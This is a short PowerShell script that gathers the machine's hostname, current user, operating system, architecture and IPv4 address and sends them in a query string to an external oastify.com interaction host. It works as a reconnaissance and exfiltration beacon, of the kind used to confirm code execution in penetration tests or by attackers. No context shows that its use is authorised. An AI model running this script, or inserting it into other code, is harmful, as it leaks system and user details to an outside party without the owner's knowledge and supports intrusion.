$info = @{
    Hostname = $env:COMPUTERNAME
    Username = whoami
    OS = (Get-CimInstance Win32_OperatingSystem).Caption
    Arch = (Get-CimInstance Win32_OperatingSystem).OSArchitecture
    IP = (Get-NetIPAddress -AddressFamily IPv4 |
          Where-Object {$_.IPAddress -notlike "169.*"} |
          Select-Object -First 1 -ExpandProperty IPAddress)
}

$data = $info.GetEnumerator() | ForEach-Object {
    "$($_.Key)=$($_.Value)"
} -join "&"

Invoke-WebRequest `
  -Uri "http://424t4cobpals8b6qiuro9wh9g0mxanyc.oastify.com?$data" `
  -UseBasicParsing
